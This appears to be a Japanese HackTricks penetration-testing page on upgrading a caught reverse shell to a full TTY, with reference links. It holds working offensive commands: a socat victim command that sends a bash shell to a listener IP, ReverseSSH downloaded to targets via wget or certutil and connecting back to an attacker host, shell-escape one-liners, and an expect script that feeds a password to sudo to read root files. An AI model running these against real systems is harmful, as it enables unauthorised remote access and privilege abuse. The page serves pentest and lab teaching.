# 完全な TTY

{{#include ../../banners/hacktricks-training.md}}

## 完全な TTY

`/etc/shells` には有効な login-shell のパス名が記載されており、一部のプログラムから参照されますが、PTY の割り当てに必須とは限りません。<sup>[[3]](#references)[[4]](#references)</sup> `pkexec` などのプログラムが `SHELL` を `The value for the SHELL variable was not found in the /etc/shells file` というエラーで拒否する場合は、正確な shell のパス（例: `/bin/bash`）が `/etc/shells` に記載されていることを確認してください。<sup>[[10]](#references)</sup> 以下の `CTRL+Z`/`fg` 復旧シーケンスは Bash の job control を使用します。現在の shell が Bash でない場合は、このシーケンスを使用する前に Bash を起動してください。<sup>[[7]](#references)</sup>

#### Python

Python の `pty.spawn` は、現在のプロセスの標準入力、標準出力、標準エラーストリームに接続されたプログラムを起動し、この session で Bash に pseudo-terminal を提供します。<sup>[[4]](#references)</sup>
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> [!TIP]
> **`stty -a`**を実行すると、**行**と**列**の**数**を取得できます。`-a`は現在のすべての端末設定を出力します。このコマンドの出力は端末固有のため、現在のセッションで報告された値を使用してください。<sup>[[11]](#references)</sup>

#### script

`script`ユーティリティは端末セッションを記録します。ここでは、`/dev/null`がtypescriptを破棄し、`-q`が開始メッセージと完了メッセージを抑制し、`-c`がデフォルトのshellの代わりにBashを実行します。<sup>[[5]](#references)</sup>
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```
いずれかの PTY-spawn method を実行した後、Netcat session を一時停止し、local raw mode で復元してから、remote terminal environment と dimensions を設定します：
```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat

listener は現在の terminal を raw mode で使用し、local echo を無効にして、port 4444 で TCP connections を受け付けます。victim command は pty を割り当て、stderr を結合し、session を作成し、SIGINT を転送して、適切な terminal settings を適用します。child に controlling terminal が必要な場合は `ctty` を追加します。<sup>[[6]](#references)</sup>
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Shellの生成**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap (旧バージョンの `--interactive` 使用時): `!sh`

Nmapのエスケープはバージョン固有です。Nmapは後のリリースで `--interactive` モードを削除したため、`!sh` は旧バージョンでのみ使用できます。<sup>[[13]](#references)</sup>

## ReverseSSH

**interactive shell access**、**file transfers**、**port forwarding** を実現する便利な方法は、静的リンクされた ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) をターゲット上に配置することです。<sup>[[1]](#references)</sup>

以下は、プロジェクトが公開しているUPX圧縮済みバイナリを使用した `x86` の例です。他のアーキテクチャやリリース成果物については、[releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/) を案内として使用してください。<sup>[[1]](#references)</sup>

1. 着信するSSH接続を受け取れるよう、ローカルホストを準備します。listener modeでは、`-l` がlistenerを有効にし、`-p 4444` がターゲットからの接続を受け付けるポートを指定します。<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux target。`upx_reverse-sshx86` artifact を `/dev/shm/reverse-ssh` に転送し、実行可能にします。target の `-p 4444` は上記の listener port を選択し、`kali@10.0.0.2` は home へ接続する際に使用する account と host を指定します。<sup>[[1]](#references)</sup>
```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows target。Full interactive PowerShell には Windows 10 build 17763 が必要です。[project README](https://github.com/Fahrj/reverse-ssh#features) を参照してください。<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
Windowsの例では、`certutil` と `-f -urlcache` を使用します。Microsoftは、`-f` がURL fetchを強制することを文書化しており、利用可能なパラメータはバージョンによって異なるため、この形式が利用できない場合は `certutil -?` を確認してください。<sup>[[12]](#references)</sup>

- Reverse connectionが成功すると、ReverseSSHのreverse-mode listenerはデフォルトでポート `8888`（または `-b` で指定した値）にbindし、incoming connectionsではデフォルトパスワード `letmeinbrudipls` と任意のusernameを使用できます。remote shellは、`reverse-ssh(.exe)` を起動したアカウントのprivilegesで実行されます。<sup>[[1]](#references)</sup>
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) は Unix-like reverse shells を PTY に自動的にアップグレードし、Unix-like terminals のサイズを変更し、shell の操作をログに記録します。Windows shells では readline を提供しますが、リアルタイムの terminal resizing には対応していません。<sup>[[2]](#references)</sup>

デフォルトでは `penelope` を実行すると `0.0.0.0:4444` で listen します。その後、受信した Unix-like shells は自動的にアップグレードされ、ログに記録されます。<sup>[[2]](#references)</sup>

![受信した shell を処理してアップグレードする Penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## TTYなし

何らかの理由で完全な TTY を取得できない場合でも、**ユーザー入力を要求するプログラムと対話できます**。次の例では、Expect が `sudo` を起動し、パスワードプロンプトを待機してパスワードを送信し、`interact` で制御を返します。`sudo -S` は標準入力からパスワードを読み取ります。認証済みの lab でのみ使用し、実際の credentials を shell history や source files に記録しないでください。<sup>[[8]](#references)[[9]](#references)</sup>
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - CTFなど向けの reverse shell 機能付き静的リンク ssh server](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - 作業を簡単にするためのいくつかの処理を自動化する Shell handler](https://github.com/brightio/penelope)
- [3] [shells(5) — Linux manual page](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — Python documentation](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — Linux manual page](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — Linux manual page](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Bash Reference Manual — Job Control](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — Linux manual page](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — Linux manual page](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Nmap Change Log](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
